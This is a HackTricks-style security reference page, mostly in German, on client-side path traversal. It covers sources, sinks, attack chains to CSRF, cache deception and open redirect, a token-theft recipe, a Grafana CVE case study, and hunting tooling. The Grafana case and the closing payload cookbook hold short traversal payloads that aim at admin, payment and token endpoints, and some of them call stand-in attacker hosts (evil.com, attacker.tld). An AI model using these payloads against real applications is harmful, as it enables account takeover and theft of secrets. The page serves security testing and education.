# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## Grundlegende Informationen

A client side path traversal tritt auf, wenn du den Pfad einer URL manipulieren kannst, die einem Nutzer auf legitime Weise zum Besuch gesendet wird oder die ein Nutzer auf irgendeine Weise gezwungen wird zu besuchen, zum Beispiel via JS oder CSS. CSPT ist auch bekannt als On-Site Request Forgery (OSRF), weil es dir erlaubt, den Browser des Opfers dazu zu zwingen, beliebige Pfade derselben Origin mit deren cookies, JWTs oder mTLS certificates aufzurufen.

Typische Quellen (Daten, die du kontrollierst):

- Route-Parameter, die in `fetch()`- oder XHR-Pfade concatenated werden (React Router, Next.js dynamic routes, Vue router params, Angular `ActivatedRoute`).
- Gespeicherte Werte (profile slugs, document IDs), die in Pfade interpoliert werden innerhalb von background jobs, service workers oder WebSocket-URLs.
- UI-Gadgets (download/export buttons, image galleries), die benutzerkontrollierte Fragmente oder Dateiendungen an API-Endpunkte anhängen, bevor die Anfrage abgesendet wird.

Typische Senken (wo die Traversal landet):

- Frontend-API-Wrapper, die `/api/` oder `/proxy/` voranstellen und Auth-Header automatisch wiederverwenden.
- `history.pushState` / `router.navigate` Helfer, die URLs später während der Hydration rekonstruieren.
- `<link>`/`<style>`/`@import`-Anweisungen, die von CMS-Inhalten oder Feature-Flag-Payloads generiert werden.

### Häufige Auswirkungen & Ketten

- **CSPT ➜ CSRF/OSRF**: kapere authentifizierte `POST/PUT/DELETE`-Aufrufe, indem du den vorgesehenen Ressourcenpfad verlässt und dann erneut sensible Endpunkte (Passwort-Reset, Zahlungsfreigabe, Zugriffsaufhebung) ansteuerst. Kombiniere mit der [CSRF](csrf-cross-site-request-forgery.md) Checkliste, um zu eskalieren.
- **CSPT ➜ cache deception / poisoning**: stelle attacker-controlled JSON unter öffentlichen CDN-Keys bereit und spiele es unauthentifiziert ab. Siehe [Cache Poisoning and Cache Deception](cache-deception/README.md).
- **CSPT ➜ Open Redirect ➜ XSS/SSRF**: die Traversal landet bei einem Open Redirect-Endpunkt, der dann zur Angreifer-Infrastruktur weiterleitet, welche bösartiges JS oder SSRF-Payloads ausliefert. Kombiniere mit [Open Redirect](open-redirect.md) Abusen.

### Beispielbefunde

- In [**this writeup**](https://erasec.be/blog/client-side-path-manipulation/), es war möglich, die **invite URL zu ändern**, sodass am Ende eine Karte **storniert wurde**.
- In [**this writeup**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html), war es möglich, eine **client side path traversal via CSS** (es war möglich, den Pfad zu ändern, von dem eine CSS-Ressource geladen wurde) mit einem **open redirect** zu kombinieren, um die CSS-Ressource von einer **attacker controlled domain** zu laden.
- In [**this writeup**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html), zeigt sich eine Technik, wie man CSPT **zur Durchführung eines CSRF-Angriffs** missbrauchen kann. Dies geschieht, indem man **alle Daten überwacht**, die ein Angreifer kontrollieren kann (URL-Pfad, Parameter, Fragment, in die DB injizierte Daten...) **und die Senken**, in denen diese Daten enden (ausgeführte Requests).
- Check [**this browser extension**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/) to monitor that.
- Check this [**CSPT playground**](https://github.com/doyensec/CSPTPlayground) to try the technique.
- Check [**this tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html) on how to use the browser extension in the playground.

## CSPT-assisted web cache poisoning/deception

CSPT kann mit extension-based CDN-Caching verknüpft werden, um sensibles JSON, das durch authentifizierte API-Calls leaked wurde, zu exfiltrieren:

- Ein Frontend konkatenierte benutzerkontrollierte Eingaben in einen API-Pfad und fügte beim fetch/XHR Auth-Header hinzu.
- Durch Injizieren von Dot-Segmenten (../) kannst du die authentifizierte Anfrage auf einen anderen Endpunkt derselben Origin umleiten.
- Wenn dieser Endpunkt (oder eine Pfadvariante mit einer statisch aussehenden Endung wie .css) vom CDN gecached wird, ohne auf Auth-Header zu variieren, kann die authentifizierte Antwort des Opfers unter einem öffentlichen Cache-Key gespeichert und von jedermann abgerufen werden.

Schnelles Rezept:

1) Finde SPA-Code, der API-URLs aus Pfad-Parametern baut, während Auth-Header gesendet werden.
2) Identifiziere sensitive Endpunkte und teste statische Suffixe (.css, .js, .jpg, .json), um zu prüfen, ob das CDN zu Cache-Control: public/max-age und X-Cache: Hit wechselt, während JSON zurückgegeben wird.
3) Locke das Opfer auf eine URL, die Traversal in den SPA-Parameter injiziert, sodass der authentifizierte fetch die cachebare Pfadvariante trifft (z.B. ../../../v1/token.css).
4) Rufe dieselbe URL anonym auf, um das gecachte Geheimnis zu erhalten (token → ATO).

Siehe Details und Gegenmaßnahmen auf der Cache Deception-Seite: [Cache Poisoning and Cache Deception](cache-deception/README.md).

## Hunting workflow & tooling

### Passive discovery with intercepting proxies

- **Correlate sources/sinks automatically**: die [CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) parst deinen Proxy-Verlauf, clustert Parameter, die später in den Pfaden anderer Requests reflektiert werden, und kann Proof-of-Concept-URLs mit Canary-Tokens neu ausgeben, um ausnutzbare Traversals zu bestätigen. Nach dem Laden des JAR setze den `Source Scope` auf Client-Parameter (z. B. `id`, `slug`) und die `Sink Methods` auf `GET, POST, DELETE`, sodass die Extension gefährliche Request-Builder hervorhebt. Du kannst alle verdächtigen Quellen mit einem eingebetteten Canary exportieren, um sie in Bulk zu validieren.
- **Look for double-URL-decoding**: beim Browsen mit Burp oder ZAP achte auf `/api/%252e%252e/`-Muster, die vom Frontend normalisiert werden, bevor sie das Netzwerk erreichen — diese tauchen meist als base64-encoded JSON-Bodies auf, die auf Route-State verweisen, und sind ohne automatisierten Scanner leicht zu übersehen.

### SPA-Senken manuell instrumentieren

Ein kurzes Snippet in den DevTools platziert hilft, verborgene Traversals aufzudecken, während du mit der UI interagierst:
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- Füge ähnliche Wrapper um `XMLHttpRequest.prototype.open`, `history.pushState` und framework-spezifische Router (z. B. `next/router`) hinzu. Auf `init.credentials === "include"` zu achten schränkt schnell Requests ein, die session cookies tragen.
- Wenn die App Routing-Hinweise in IndexedDB/localStorage speichert, ändere diese Einträge mit traversal payloads und lade neu — der veränderte Zustand wird oft vor der Hydration wieder in Requests injiziert.

### Labor & payload-Übung

- Starte das CSPT Playground mit `docker compose up` und übe das Verketten von traversal ➜ CSRF ➜ stored XSS-Abläufen, ohne das Ziel zu berühren. Die lokale Reproduktion der Routerstruktur des Ziels macht es einfacher, teilbare PoCs zu erstellen.
- Führe ein Notizblatt mit erfolgreichen dot-segment-Variationen (`..;/`, `%2e%2e/`, `%2e./%2e/`, UTF-8 homoglyphs) und Suffix-Tricks (`.css`, `.json`, `;` matrix params), die du während der recon beobachtet hast, damit du sie schnell wieder abspielen kannst, wenn ein neuer sink erscheint.

## Aktuelle Fallstudien (2025)

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – Ein traversal gadget innerhalb von `/public/plugins/` erlaubte es Angreifern, `../../` in den Plugin Asset Loader einzuschmuggeln, es mit Grafana’s open redirect zu verketten und Opfer dazu zu zwingen, vom Angreifer kontrollierte Plugin-Bundles zu laden. Wenn anonymous dashboards aktiviert waren, führte eine speziell gestaltete URL wie `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js` dazu, dass der Browser remote JavaScript ausführte; wenn das Image Renderer plugin installiert war, konnte dieselbe Primitive in SSRF umgedreht werden, indem Rendering-Requests auf interne Hosts umgeleitet wurden. Teste stets Plugin-Asset-Pfade, anonymous dashboards und Renderer-Endpunkte zusammen, da ein einzelner traversal oft sowohl XSS- als auch SSRF-Winkel liefert.

## Payload-Kochbuch

| Ziel | Payload-Muster | Anmerkungen |
| --- | --- | --- |
| Hit sibling API under same origin | `?doc=../../v1/admin/users` | Funktioniert, wenn Router einfach `/${doc}` konkatenieren. Füge `.json` hinzu, wenn das CDN nur statisch aussehende Assets zwischenspeichert. |
| Force SPA to follow open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | Mit vertrauenswürdigen redirectors kombinieren, die im Codebase des Ziels gelistet sind. Mit [Open Redirect](open-redirect.md) verketten. |
| Abuse extension-based CDN cache | `?file=../../v1/token.css` | Das CDN könnte `.css` als statisch behandeln und Geheimnisse, die als JSON zurückgegeben werden, zwischenspeichern. |
| CSRF via verb change | `?action=../../payments/approve/.json&_method=POST` | Einige Router akzeptieren `_method`-Overrides; mit traversal kombinieren, um destruktive Endpunkte neu anzuzielen. |

## Referenzen

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
